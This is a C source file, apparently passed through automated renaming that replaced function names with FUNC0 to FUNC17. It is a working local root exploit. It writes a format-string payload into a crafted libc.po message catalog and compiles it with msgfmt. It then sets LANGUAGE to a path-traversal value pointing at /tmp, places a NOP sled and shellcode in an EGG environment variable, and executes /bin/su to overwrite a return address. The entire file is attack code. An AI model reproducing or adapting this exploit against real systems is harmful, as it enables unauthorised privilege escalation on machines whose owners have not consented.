#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  FILE ;

/* Variables and functions */
 int DEFAULT_ALIGNMENT ; 
 int DEFAULT_BUFFER_SIZE ; 
 int DEFAULT_EGG_SIZE ; 
 int DEFAULT_OFFSET ; 
 long DEFAULT_RETLOC ; 
 int /*<<< orphan*/  NOP ; 
 int /*<<< orphan*/  PATH ; 
 int FUNC0 (char*) ; 
 int /*<<< orphan*/  FUNC1 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC2 (char*,char*,char*,char*,int /*<<< orphan*/ *,char**) ; 
 int /*<<< orphan*/  FUNC3 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC4 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/ * FUNC5 (char*,char*) ; 
 int /*<<< orphan*/  FUNC6 (int /*<<< orphan*/ *,char*,...) ; 
 int FUNC7 () ; 
 char* FUNC8 (int) ; 
 int /*<<< orphan*/  FUNC9 (char*,char*,int) ; 
 int /*<<< orphan*/  FUNC10 (char*,char,int) ; 
 int /*<<< orphan*/  FUNC11 (int /*<<< orphan*/ ,int) ; 
 int /*<<< orphan*/  FUNC12 (char*,...) ; 
 int /*<<< orphan*/ * shellcode ; 
 int /*<<< orphan*/  FUNC13 (char*,char*,int,int) ; 
 int /*<<< orphan*/  FUNC14 (char*,char*,long*) ; 
 int FUNC15 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC16 (char*) ; 

FUNC17(int argc, char *argv[]) {
  char *buff, *buff1, *ptr, *egg;
  char *env[3];
  long shell_addr,retloc=DEFAULT_RETLOC,tmpaddr;
  int offset=DEFAULT_OFFSET, align=DEFAULT_ALIGNMENT;
  int bsize=DEFAULT_BUFFER_SIZE, eggsize=DEFAULT_EGG_SIZE;
  int i,reth,retl,num=113;
  FILE *fp;

  if (argc > 1) FUNC14(argv[1],"%x",&retloc);
  if (argc > 2) offset  = FUNC0(argv[2]);
  if (argc > 3) num = FUNC0(argv[3]);
  if (argc > 4) align = FUNC0(argv[4]);
  if (argc > 5) bsize   = FUNC0(argv[5]);
  if (argc > 6) eggsize = FUNC0(argv[6]);



  FUNC12("Usages: %s <RETloc> <offset> <num> <align> <buffsize> <eggsize> \n",argv[0]);

  if (!(buff = FUNC8(eggsize))) {
       FUNC12("Can't allocate memory.\n");
       FUNC3(0);
    }


  if (!(buff1 = FUNC8(bsize))) {
       FUNC12("Can't allocate memory.\n");
       FUNC3(0);
    }

  if (!(egg = FUNC8(eggsize))) {
    FUNC12("Can't allocate memory.\n");
    FUNC3(0);
  }

    FUNC12("Using RET location address: 0x%x\n", retloc);
    shell_addr = FUNC7() + offset;
    FUNC12("Using Shellcode address: 0x%x\n", shell_addr);

    reth = (shell_addr >> 16) & 0xffff ;
    retl = (shell_addr >>  0) & 0xffff ;

    ptr = buff;

    for (i = 0; i <2 ; i++, retloc+=2 ){
       FUNC10(ptr,'A',4);
       ptr += 4 ;
       (*ptr++) =  retloc & 0xff;
       (*ptr++) = (retloc >> 8  ) & 0xff ;
       (*ptr++) = (retloc >> 16 ) & 0xff ;
       (*ptr++) = (retloc >> 24 ) & 0xff ;
      }

     FUNC10(ptr,'A',align);

     ptr = buff1;

     for(i = 0 ; i < num ; i++ )
     {
        FUNC9(ptr, "%.8x", 4);
        ptr += 4;
     }

     FUNC13(ptr, "%%%uc%%hn%%%uc%%hn",(retl - num*8),
              (0x10000 + reth - retl));


    FUNC11(PATH,0755);
    FUNC1(PATH);
    fp = FUNC5("libc.po", "w+");
    FUNC6(fp,"msgid \"%%s: invalid option -- %%c\\n\"\n");
    FUNC6(fp,"msgstr \"%s\\n\"", buff1);
    FUNC4(fp);
    FUNC16("/usr/bin/msgfmt libc.po -o libc.mo");


    ptr = egg;
    for (i = 0; i < eggsize - FUNC15(shellcode) - 1; i++)
      *(ptr++) = NOP;

    for (i = 0; i < FUNC15(shellcode); i++)
      *(ptr++) = shellcode[i];

    egg[eggsize - 1] = '\0';

    FUNC9(egg, "EGG=", 4);
    env[0] = egg ;
    env[1] = "LANGUAGE=sk_SK/../../../../../../tmp";
    env[2] = (char *)0 ;

    FUNC2("/bin/su","su","-u", buff, NULL,env);

}